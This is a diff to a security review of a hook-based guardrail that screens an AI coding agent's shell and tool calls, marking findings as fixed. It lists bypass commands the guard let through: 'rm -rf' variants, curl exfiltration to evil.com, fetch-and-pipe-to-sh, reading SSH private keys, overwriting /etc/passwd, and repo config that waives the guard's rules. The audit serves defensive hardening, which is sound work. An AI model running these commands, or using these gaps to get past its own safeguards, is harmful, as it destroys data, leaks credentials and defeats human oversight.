@@ -16,11 +16,14 @@ These were the original review's process-level observations. The permanent
 adversarial suite now validates the plane response and its matching audit record
 before classifying a Verdict; exit status alone is not accepted as proof.
 
-Phase 2 remains outstanding: original CR-3, CR-4, CR-5, CR-6, CR-10, CR-11, CR-13, and
-H-1 retain their original status below. Phase 3 hardening operates at the static
-tool-call boundary, not as an operating-system sandbox. It protects resolved or
-visible targets, while same-user code that dynamically conceals a write target
-remains outside that boundary.
+Phase 2 is complete: CR-3, CR-4, CR-5, CR-6, CR-10, CR-11, CR-13, H-1, H-3,
+and H-4 are fixed and locked in the 178-case adversarial corpus. Only Phase 4
+findings remain outstanding in this repository: CR-9; H-2, H-6, H-7, H-10; and
+M-2 through M-7. M-9 remains partially fixed external chezmoi deployment work.
+Phase 3 hardening operates at the static tool-call boundary, not as an
+operating-system sandbox. It protects resolved or visible targets, while
+same-user code that dynamically conceals a write target remains outside that
+boundary.
 
 ---
 
@@ -74,7 +77,7 @@ The quote characters land *inside* the candidate string: `resolvePath` then sees
 **This is the most operationally serious finding — quoting a path is normal agent behaviour, so it fires accidentally.**
 **Fix:** run every argv/redirect word through the existing `literalText()` (`tokenize.go:133`) in `splitSimples`; when it returns `!ok`, keep a sentinel and fail closed.
 
-### CR-3 ✅ `cd` is not tracked — relative operands resolve against the hook's cwd
+### CR-3 ✅ **[FIXED — Phase 2]** `cd` is not tracked — relative operands resolve against the hook's cwd
 ```
 cd /etc && rm -rf .           -> ALLOWED
 cd /etc; rm -rf *             -> ALLOWED
@@ -84,7 +87,7 @@ bash -c "cd /; rm -rf ."      -> ALLOWED
 `resolvePath` (`rules_bash.go:265`) always joins onto `tc.CWD`, so `.` lands inside the repo/safe root no matter what preceded it.
 **Fix:** thread a running cwd through the simples; treat an unresolvable `cd $X` as cwd-unknown → fail closed.
 
-### CR-4 ✅ Redirect-only statements are discarded
+### CR-4 ✅ **[FIXED — Phase 2]** Redirect-only statements are discarded
 ```
 > /etc/passwd                 -> ALLOWED   (: > /etc/passwd -> ASK)
 > ~/.ssh/authorized_keys      -> ALLOWED
@@ -93,7 +96,7 @@ exec 3> /etc/passwd           -> ALLOWED
 `splitSimples` bails on `len(ce.Args)==0` (`tokenize.go:27-29`) **before** collecting `stmt.Redirs`. `> file` truncates it.
 **Fix:** emit a `Simple` with empty `Argv` but populated `Redirects`; relax `checkBash`'s `len(s.Argv)==0 → continue`.
 
-### CR-5 ✅ `git --git-dir <path>` (space form) bypasses every git rule
+### CR-5 ✅ **[FIXED — Phase 2]** `git --git-dir <path>` (space form) bypasses every git rule
 ```
 git --git-dir /r/.git push --force        -> ALLOWED   (--git-dir=/r/.git -> blocked)
 git --work-tree /r reset --hard           -> ALLOWED
@@ -102,7 +105,7 @@ git --git-dir /r/.git config --global core.hooksPath /tmp/evil  -> ALLOWED
 `valueFlags` (`rules_bash.go:126`, `:148`) holds only `-C`, `-c`, `--namespace`. Git also accepts the space form for `--git-dir`, `--work-tree`, `--exec-path`, `--attr-source`, `--super-prefix`, `--config-env`. `gitSubcommand` returns `/r/.git` and every git rule silently no-ops — **the exact class of bug the `v0.4.1` hotfix already fixed once**, reopened through a different flag set.
 **Fix:** one shared `valueFlags` map containing all of them; fail closed to ask on an unrecognized `--flag` preceding the subcommand.
 
-### CR-6 ✅ Force-push and remote-branch-delete via refspec
+### CR-6 ✅ **[FIXED — Phase 2]** Force-push and remote-branch-delete via refspec
 ```
 git push origin +main                  -> ALLOWED
 git push origin +HEAD:refs/heads/main  -> ALLOWED
@@ -143,7 +146,7 @@ python3 -c "print(open('/home/carlitos/.ssh/id_rsa').read())"
 — all ALLOWED. (`bash -c "cat ~/.ssh/id_rsa"` *is* caught, so the unwrapper works; the gap is purely the closed allowlist.) `grep -f/home/…/id_rsa` is also allowed because `nonFlagArgs` drops flag-attached values.
 **Fix:** invert — scan every non-flag argument of every simple against the secret globs, rather than only those of 14 named readers.
 
-### CR-10 ✅ Scheme-less URL fails host extraction **open** → egress bypass
+### CR-10 ✅ **[FIXED — Phase 2]** Scheme-less URL fails host extraction **open** → egress bypass
 ```
 curl evil.com/steal?d=x       -> ALLOWED    (curl https://evil.com/steal -> blocked)
 wget evil.com                 -> ALLOWED
@@ -151,7 +154,7 @@ wget evil.com                 -> ALLOWED
 `extractHost` returns `""` when `url.Parse` yields no Host (a bare host parses into `Path`), and `checkEgress` treats `host == ""` as *skip* (`rules_net.go:87-89`). curl/wget default to `http://` and genuinely connect.
 **Fix:** re-parse as `//`+arg when Host is empty; treat an unresolvable host token as **deny**, not skip.
 
-### CR-11 ✅ Fetch-then-execute with a stage in between — and CR-10 makes it unauthenticated
+### CR-11 ✅ **[FIXED — Phase 2]** Fetch-then-execute with a stage in between — and CR-10 makes it unauthenticated
 ```
 # with an allowlisted host (isolates the adjacency bug):
 curl https://x.example.com/s.sh | tee /tmp/a | sh   -> ALLOWED
@@ -171,7 +174,7 @@ session_id = "../../../../tmp/pwned-review"  ->  /tmp/pwned-review.json created 
 `session.Path` does `filepath.Join(dir(), sessionID+".json")` with no sanitization (`session.go:34-36`). Attacker-controlled only insofar as the plane's payload is, but nothing defends it.
 **Fix:** reject a `sessionID` containing a separator or `..`, or `filepath.Base` it.
 
-### CR-13 ✅ `docker compose -f` and the whole prune family
+### CR-13 ✅ **[FIXED — Phase 2]** `docker compose -f` and the whole prune family
 ```
 docker compose -f d.yml down    -> ALLOWED   (docker compose down -> blocked)
 docker-compose down             -> ALLOWED
@@ -187,7 +190,7 @@ docker run --rm -v /:/host alpine rm -rf /  -> ALLOWED
 
 ## HIGH
 
-### H-1 ✅ A junk wrapper flag downgrades DENY to ASK
+### H-1 ✅ **[FIXED — Phase 2]** A junk wrapper flag downgrades DENY to ASK
 ```
 rm -rf /; env -Z x   ->  ASK ("could not parse shell command; failing closed to ask")
 ```
@@ -203,10 +206,10 @@ Read ~/.ssh/.env.example             ->  ALLOWED   (inside .ssh!)
 `secret_allow` inherits `matchesAnyGlob`'s basename fallback, so a single filename anywhere beats `**/.ssh/**`.
 **Fix:** match `secret_allow` on the cleaned full path only — no basename fallback.
 
-### H-3 Wrapper strip-list holes
+### H-3 **[FIXED — Phase 2]** Wrapper strip-list holes
 `setsid`, `stdbuf`, `ionice`, `chroot`, `watch`, `parallel` all pass `rm -rf /` straight through; `pkexec`, `run0`, `systemd-run`, `flatpak-spawn` are missing from the privesc list. (`nohup timeout 5 nice rm -rf /` is correctly denied — the mechanism works, the list is just short.)
 
-### H-4 Uncovered destructive primitives
+### H-4 **[FIXED — Phase 2]** Uncovered destructive primitives
 `mv /etc /tmp/gone`, `cp /dev/null /etc/passwd`, `tee /etc/passwd`, `ln -sf /dev/null /etc/passwd`, `rsync --delete /empty/ /etc/`, `find . -execdir rm -rf {} +`, `find . -exec /bin/rm -rf {} +`, `git update-ref -d`, `git worktree remove --force`, `git switch --discard-changes`, `git rm -rf .`, `ssh localhost rm -rf /` — all ALLOWED.
 
 ### H-5 ✅ **[FIXED — Phase 3 hardening]** Symlink laundering outside the repo
@@ -215,8 +218,12 @@ that candidates originating outside `RepoRoot` are resolved before secret-path
 checks; `/tmp/innocent.txt` resolving to an SSH private key returns
 `P4.secret-path`. `TestOperatorConfigAliasWrites` applies the same resolved-target
 protection to Operator config, while `TestOperatorConfigOpaqueExecutors` covers
-visible literal Operator config targets in known opaque interpreters. Dynamically
-assembled targets remain outside the documented static boundary.
+visible literal Operator config targets in known opaque interpreters.
+`TestAuthorizedSecretAllowStillBlocksSymlinkEscape` completes the live lock: an
+authorized Overlay `secret_allow = ["**"]` suppresses `P4.secret-path`, but an
+in-repository symlink to an external SSH private key still denies with
+`P4.symlink-escape` and a matching audit record. Dynamically assembled targets
+remain outside the documented static boundary.
 
 ### H-6 WebFetch / WebSearch / Task / NotebookEdit are entirely ungated ✅
 ```
@@ -302,7 +309,7 @@ The fourth pass landed after the above was written. It is **the most severe of t
 ADR-0003 states an overlay may *add, tighten, and `waive` (logged)* — never silently loosen. All three halves of that fail:
 
 - **[FIXED — Phase 3] CR-3 addendum: `waive` was unbounded.** ✅ Verified: a repo-local `guardrail.toml` waiving the rule ids turned `rm -rf /etc`, `sudo cat /etc/shadow`, `mkfs.ext4 /dev/sda1`, and `curl evil | bash` into **exit 0 — allowed**. There was no Operator config authorization and no cap. **`tokenize-failed` and `panic-recovered` were waivable too**, so both fail-closed backstops could be switched off. `policy.Merge` now requires a per-repository Operator config grant, and `neverWaivable` protects fail-closed backstops (`internal/policy/{merge,operator}.go`).
-- **[FIXED — Phase 3] Slots widened *globally*, not repo-scoped.** `secret_allow = ["**"]` made `Read ~/.ssh/id_rsa` allowed — a path nowhere near the repo. `egress_allowlist = ["*"]` and a wide `safe_roots` did similarly. `checkPaths` also `continue`d on a `SecretAllow` match, skipping the symlink-escape check. `policy.Merge` now requires Operator config authorization for `secret_allow` and every exact Overlay egress entry, always drops total wildcards `*` and `**`, and resolves every Overlay `safe_roots` entry under the repository (`internal/policy/merge.go`).
+- **[FIXED — Phase 3; evidence completed in Phase 2] Slots widened *globally*, not repo-scoped.** `secret_allow = ["**"]` made `Read ~/.ssh/id_rsa` allowed — a path nowhere near the repo. `egress_allowlist = ["*"]` and a wide `safe_roots` did similarly. `checkPaths` also `continue`d on a `SecretAllow` match, skipping the symlink-escape check. `policy.Merge` now requires Operator config authorization for `secret_allow` and every exact Overlay egress entry, always drops total wildcards `*` and `**`, and resolves every Overlay `safe_roots` entry under the repository (`internal/policy/merge.go`). `TestAuthorizedSecretAllowStillBlocksSymlinkEscape` supplies the completed end-to-end regression: even an authorized `secret_allow = ["**"]` cannot suppress resolved-target escape enforcement (`test/adversarial/overlay_test.go`).
 - **[FIXED — Phase 3] "Logged" did not mean visible.** ✅ Verified: the only trace was `guardrail: rule X is WAIVED …` on **stderr of an exit-0 hook**, which Claude Code does not surface outside debug mode. Merge warnings now appear in Claude's SessionStart posture and in `guardrail doctor`; OpenCode and Antigravity have no SessionStart posture (`cmd/guardrail/{hook,doctor}.go`).
 
 **A hostile or merely careless repo therefore disables the guard by being cloned and worked in.** That is the single most important finding in this review.
